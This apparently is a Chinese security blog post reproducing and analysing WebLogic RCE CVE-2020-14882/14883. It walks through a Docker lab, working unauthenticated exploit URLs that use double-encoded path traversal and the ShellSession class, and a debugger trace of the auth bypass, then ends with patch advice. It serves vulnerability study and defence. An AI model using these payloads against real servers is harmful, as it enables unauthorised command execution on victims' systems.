> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oVL9D69Xrdoez6T-sheJLg)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：ebounce****@Timeline Sec  
**

**本文字数：3235**

**阅读时长：9～10min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

Weblogic 是美国 Oracle 公司出品的一个 Application Server，确切的说是一个基于 JavaEE 架构的中间件，Weblogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。  

**0x02 漏洞概述**  

  

**编号：CVE-2020-14882****&14883**  
未经身份验证的远程攻击者可能通过构造特殊的 GET 请求，利用该漏洞在受影响的 Weblogic Server 上执行任意代码。

**0x03 影响版本**  

  

weblogic 10.3.6.0.0

weblogic 12.1.3.0.0

weblogic 12.2.1.3.0

weblogic 12.2.1.4.0

weblogic 14.1.1.0.0

**0x04 环境搭建**  

  

省去安装 Weblogic 在本地的麻烦, 我们使用 docker 环境进行复现, 由于前几天 P 师傅已经更新了 vulhub 环境，已经可以直接复现了，但由于我复现的时候 vulhub 还没有更新，使用的是 vulnhub/weblogic, 该镜像现在也更新了, 12.2.1.3-2018 tag 的镜像同样可以复现成功。  

这里我使用老镜像，因为体积要小很多。

PS：本地物理机搭建的环境同理  

```
sudo docker pull vulhub/weblogic:12.2.1.3-2018
sudo docker run -d -p 7001:7001 -p 8055:8055 vulhub/weblogic:12.2.1.3-2018
```

启动脚本后，浏览器访问  

http://<your_ip>:7001/console

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVshwUL3uf6a5yba2FZGmGc5kteo4SlOlpetPc3BwP7uggIww5mickkK3BvwoTdUcq6gCGZlMR31zL9g/640?wx_fmt=png)

正常显示控制台登录界面，即代表安装成功。

**0x05 漏洞复现**  

  

根据网上流传较广的 POC：  

```
/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27执行的命令%27);%22);
```

我们使用创建文件的命令测试 POC:

```
http://127.0.0.1:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/pocIsok%27);%22);
```

然后页面上会显示 404：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crx7MJaThiaBvJKq7N3mn4hQ9gIlZglwXjJLDonUjiauxxzOLObApAExbA/640?wx_fmt=png)

然而实际上在 docker 内部我们执行命令已经成功了：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crOia45OLmxZaQiaKmlhUaQibc4IdnWVLlKr5CwQPQvxwq0RPQCUBwbEgQg/640?wx_fmt=png)

**0x06 漏洞分析**  

  

由于 weblogic 的补丁非购买技术支持用户下载不到，所以没办法比较了，只能参考多篇文章来看这个漏洞了

### **调试环境搭建**

首先远程调试需要先开启 weblogic 的远程调试，进入 docker 容器内部修改 setDomainEnv.sh, 由于该环境里面没有 vi/vim 我们复制出来，再复制进去：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crl6gLKRD7WjpIxaiayxia31sEadpTm9VDTJWXuXcIGtz9Ltjiaet7M0pAA/640?wx_fmt=png)

添加如下两句，以防万一我把 local_debug 也一起改了：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crc6dBfsEhLxoqlKWeFFIdQYZXpfq6ko1nmRgn2GPJxwCbicUtmrTILWQ/640?wx_fmt=png)

然后复制回去，随后记得重启 docker，由于复制出来是 root 权限，记得 777 一下，免得复制回去用不了这个了：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crdCWibWScpYyUH2DO3ibb0oqrTuRN3mricx2QUibE6z8DZZY0tbBESmU1Nw/640?wx_fmt=png)

然后 idea 配置一个远程调试:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crENiaPuKZQwLAEzicBR65MRhmYogvVOnYXoVMQmZ5hbw0EHaWDib3dEu9A/640?wx_fmt=png)

出现下列提示，说明可以开始愉快的调试了：  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr0fJ2E5ZwRVGecsJhnj5ednMibKAwtmXAcuVmvic7BAP8w9W1QKtUIbTg/640?wx_fmt=png)

同时我们还需要将 docker 中的源码复制出来:  

```
sudo docker cp 3eda3:/u01/oracle/ ./ # 复制weblogic全部源码
mkdir dep  &&  cp `find ./* -name "*.jar"` ./dep #将jar包全部集中复制到一起
```

最后将 dep 文件夹右击添加为库，此时 dep 中的所有 jar 包都可以展开和打断点了。

#### **RCE 部分**

调试该部分由于没有加绕过，所以请在登录到后台之后进行

payload:  

```
http://127.0.0.1:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("yahaha")
```

记得对里面的特殊字符进行 URL 编码

根据越南兄弟的补丁对比，第一处修改有:  

```
/dep/console.jar!/com/bea/console/handles/HandleFactory.class
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crA9lEhpfpgvXOnDicxbGQwRAKiajsLmsC1YsichPC3AadKjBjqicR7gsiazA/640?wx_fmt=png)

如果没修改的情况，可以发现这里可以任意指定类，并获得其以字符串为参数的构造函数，然后进行初始化。

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr1N4FicIbAw3icFSxDM6dyyWa6SEBQ89viaxOrShLjrCRrAc2jtgd0r3Pw/640?wx_fmt=png)

args 被输入数据完全控制，但无论如何只会获得一个值：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr0xToT8QxBfbFfL9PY459Pe6O6yBs6sdDtiaoiahvgPAjDvUKru7a0Leg/640?wx_fmt=png)

由此我们可以推断出，通过 url 传入的参数 handle 我们可以获得具有 string 作为构造函数的类。

##### **ShellSession 利用**

com.tangosol.coherence.mvel2.sh.ShellSession 就是大佬们找到的类，我们先看看这个类：  

```
/dep/coherence-rest.jar!/com/tangosol/coherence/mvel2/sh/ShellSession.class
```

这里尝试使用 payload：  

http://127.0.0.1:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime('ls');");

只看参数为 String 的构造函数：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7creuFTO7MZeReEC1Y8u1Y7L4ytXNC3iauHMVibn54vQpeOvn3icn6LzzbTA/640?wx_fmt=png)

真是简单又直接，这里会调用一次无参构造函数，然后再调用本类的 exec 方法：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr4dZphL7zfCB7FrQm9oWDvad2EicZfnRTBcnqeN9v8XWgrtgFof3WlGQ/640?wx_fmt=png)

_exec 非常长，从源码看来就是解析命令并执行用的，这里就不调了

我们直接直接上 payload 看看：

http://127.0.0.1:7001/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/test1%27);%22);

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr3I6F6BCYUWAn1GUCYdYPp4LJiaEsMIKiaViaeV12t5z5vnay92BhwwJqQ/640?wx_fmt=png)

经过测试这里需要对一些字符进行 URL 编码，否则无法执行：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cryv2YibAYKIbXgEUT9w82ZskBoCER4zicRrZXA0J6niaXfXk0bCEkuXbicw/640?wx_fmt=png)

最后结果为:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crjgSoRwsxc98BNYJuk77SzRS2BxCTHJBvkn3zQP7fIL8dowcRuicIADA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crAuYuo83bzyTkV8EKEklfrnVoVZLLwK8Y8yrnwf7ycn6kPheTnJdZZQ/640?wx_fmt=png)

说明执行成功了，虽然显示了报错信息，但不影响命令的执行。

其他的类可以按照此方法类推探索，这里就不多赘述了，但这个命令执行的利用条件是要进入 weblogic 后台，一个后台的 RCE 并不能让 Oracle 打出这么高的漏洞评分，因此该漏洞还存在未授权的利用。

#### **未授权访问 url 部分**

##### 找到未授权的路由

我们注意到 POC 前面但组成部分其实还含有路径穿越问题，即这段 / console/images/%252E%252E%252F，之所以会这样构造是因为存在二次 URL 编码绕过问题，但这种直接把写黑名单的方式，并不是很好的修复方式。

传送门：  

https://twitter.com/chybeta/status/1322131143034957826/photo/2

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crOrHL4JgOPk2pzPa2h5dPF1TtIRP9ACibS7byJMeTkUia7Iic8yLu3TIqg/640?wx_fmt=jpeg)

这里对路径穿越几个关键字符及其 URL 编码加以限制，那几个 URL 解出来 %.%.,..,<,>，基本属于不带.. 玩了，我们马上来看看，为什么要禁止这几个字符吧:

首先是 weblogic 的校验函数:  

```
/dep/com.oracle.weblogic.servlet.jar!/weblogic/servlet/security/internal/WebAppSecurity.class.checkAccess
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crDvKibwJZ4UlKQcicoqyjSDrVnXpX24NgocdD3kBK0I5fZibCAurL699Mw/640?wx_fmt=png)

该函数会校验请求的路由是否经过校验，这个校验的标志由 getConstraint 函数提供，打上断点之后 F7 来到了  

```
/dep/com.oracle.weblogic.servlet.jar!/weblogic/servlet/security/internal/WebAppSecurityWLS.class
```

测试命令:

```
curl http://127.0.0.1:7001/console/console.portal
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crs5x6wFsCLT6828SHBmiahwwDLukAniaFwicKLfb4q3ibH4h4OOEHTLiac5Q/640?wx_fmt=png)

我们可以看看这个函数具体是什么情况：

这里会返回一个类 StandardURLMapping，从参数名来看一个是对所有方法响应的路由，一个是对某个方法响应的路由：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crYxUAiaamqpa0cicxHJrKS4xFm2ujST2cfM3m7UOyqLDjgs0sJKe1ARmg/640?wx_fmt=png)

看看 StandardURLMapping 类：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7craIydDbCxF1oicTZQfOMwDiaEeDQDQzlApviaaDz7ibL2muLKUNsF92ic3uA/640?wx_fmt=png)

从函数名来看，这里应该是直接忽略的 URL 列表

对比得到的 matchMap，我们的 console.protal 是不在这个列表里面的：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crdqb6e7ou1TbEW7PcAfncR1KNKue5m9icpoDuOPY8LJnCFRJQByeG92g/640?wx_fmt=png)

后面我们会进入 else 分支，这里会校验是否有用户 session，由于我们没登录自然得到了 null, 随后这个 session 又会被拿去鉴权，自然也是无法通过的。

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crdFzXknibMjpkj0rFC67dx51mUPSGoibrL5SLjCaUOEJ15zCskiavyDdTQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crk1NmGxHNM67vpLKZTIJE7pcA2B1icPxhZxRjX3c0q5PtTwz4smyBIEA/640?wx_fmt=png)

curl 命令返回结果重定向到登录界面:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr5YCjAW4p5XC3P5wzlLqx0252lib462ZkAnW9yne2gxocmGmBEyia6fkQ/640?wx_fmt=png)

我们可以去访问一下 / css 目录比较一下：

```
curl http://127.0.0.1:7001/console/css/
```

此处对应的校验 id 为 / css/*，与 console.protal 唯一的不同便是 unrestricted=true,curl 命令的结果为 404

这里 404 是因为没有设置默认的界面，但总之我们成功访问到了:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crXWTYicVF63YH7RfZKD6oGHXfrlGC7p2ZVZnV4K12iaVDtB5FQrTac3ibA/640?wx_fmt=png)

##### 分析路由设置

weblogic 和其他 JavaWeb 应用类似，它有 web.xml，我们知道 web.xml 里面配置了 servlet 信息，去看看：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crk92ia1qdcnq1K3UMXicHicEPKfd0Eq0m1FKH2pYdCHNvvrnhrLuyAibicWw/640?wx_fmt=png)

其中这两处信息最重要：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crOG9JV1qF6Av9jXThjcEflibyevHRFfI6EMs2wTzgVSLELAicYyBL7tCA/640?wx_fmt=png)

这里告诉我们 *.protal 后缀但内容会被 AppManagerServlet 处理，而之前我们看到的 matchMap 中的内容，则被定义成资源，没有配备对应的 servlet

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crGAM9Byb71rn8gezibibPLlibpkMdSeX1qp9x9DufwfDyJ9Jpmtn4beUQA/640?wx_fmt=png)

所以我猜测挖洞的大佬这时候就开始考虑，如果我在不鉴权的目录下，访问只有 servlet 能处理的文件会怎样, 根据 web.xml 中的内容找到对应 servlet--/dep/com.oracle.weblogic.servlet.jar!/weblogic/servlet/AsyncInitServlet.class

打上断点，利用

```
curl http://127.0.0.1:7001/console/css/console.portal
```

结果为:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crHNF9tict7ED6jXBUzXq03kgax47QuN2x5xPEUjkTCPibiaia5oJmJMvicWA/640?wx_fmt=png)

这个路由最终交给了 AppManagerServlet 处理了

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crricY94129wHbppB64FGxIL9h5hRIWMkicEgbu3YO0OBd1ibvWyerAderg/640?wx_fmt=png)

然后这里如果直接加上 payload 是不会触发 handle 的断点:

```
curl "http://127.0.0.1:7001/console/css/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/testok%27);%22);"
```

但使用能执行的 payload 时，确实是由这个 servlet 处理的：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crkiayc0X4QHhibF3aX6hcQvJt1ibynxVfria0JNqkxg9g8b3qebgULb4pPw/640?wx_fmt=png)

因此我们需要想办法在 / css 目录，就触发 handle，从而实现未授权 RCE。

##### **触发 handle**

漏洞爆出之后我们知道了，其实触发 handle 的方法就是对../ 进行 url 双重编码。

PS: 由于我自己使用的版本是没打补丁的，因此这里没有对应的校验, 但直接使用../ 是没有办法触发漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr1bXGvzn2J36BbS6KUl4ZWwzic1Hr7y9RjQRFBbU1RtZLGtydlQQ7qGg/640?wx_fmt=png)

这里会直接被重定向到登录界面，不过也侧面说明目录便利是存在的 css/../ 被解析成了 /，这里直接得到的就是 console/console.protal

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crick2PbDUIcEicvJoyhk5q4KxIfN1ZvQkebqxWXohbFVsciao6cGOjLT3Q/640?wx_fmt=png)

这说明其实 weblogic 是会解析路径中的穿越符，因此我们需要想办法让 weblogic 不先解析 URL, 而是等鉴权完成之后才进行解析，这就需要进行 URL 编码了。一次是不够的，因为 weblogic 得到的路由是这样的:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cr1icKgn8uCHgz7sYcRW81lmxQtCngZEuFIb2DEbORu9gnHQwxhGru9gQ/640?wx_fmt=png)

此时仍然被算作 / 路由：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crKSYKo1kttxfBPIUYfx0mMOFM7p73Oz8pAh6CzrRlIHH98LOphTUICA/640?wx_fmt=png)

因此我们尝试使用二次 URL 编码，这个时候鉴权得到的路由是这样的:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crqs3K3OdXaLAQ879TWlwwh1Qc8nZaIIm0VibIHNmL31ELwQqB14KWVPQ/640?wx_fmt=png)

该路由鉴权的时候是算作 css/* 中：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crGHu2QYuGeh51MOEicQAia65GbJEaZVFswHo4ia8JWfMSk69FbT2eAagrQ/640?wx_fmt=png)

自然是鉴权通过了，最后走进 finally：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7cricywtv8mnpwJBjhZGNUeEeGkm1ibq77ibzX9ogagtOAWRnqbAnOXazZeg/640?wx_fmt=png)

跟了一路没啥发现，看了看函数栈，发现一个地方传入了解码一次 (浏览器帮着解了一次) 的 URL:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crlMUjkCx8Ju2nYNibd8hO3Yd8UYS9YVET9GUbf3ay6ibfpb30ryLuBYlw/640?wx_fmt=png)

得到 URL 的函数可能有 URL 的解码，刚好在这个函数的下方看到了一个 URL 解码：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crYVe3yvHbZo2RCZ7ia4biaaAVUMqfVGib4ZSibz3gT0z6TVLKiaBhDM8vibAw/640?wx_fmt=png)

打个断点看看结果如果：

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crOIXHkCYDFDu7D6MKBiathHjGrADjvRmuhYTUlWN2GCYDKRyBtejv5Yg/640?wx_fmt=png)

这是在第一次鉴权完成之后，鉴权完毕的 URL 会被送到这里再进行一次 URL 编码，然后被送去解析 URL 的地方，从而这里被解析成了 console/console.protal，自然就可以获得后面的 handle 了:

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsh11QJRI6lYw70Xlnic7X7crrbw4qJseOY2KzjbGVQDOSKh638oVzfgXH8JKCgribyQMRliaJfiaRPe2w/640?wx_fmt=png)

到这里漏洞就分析完毕了。

**0x07 修复方式**  

  

此次 Oracle 官方的 CPU 已发布了针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。

```
参考链接：
```

https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf  

https://github.com/jas502n/CVE-2020-14882  

https://twitter.com/chybeta/status/1322131143034957826  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行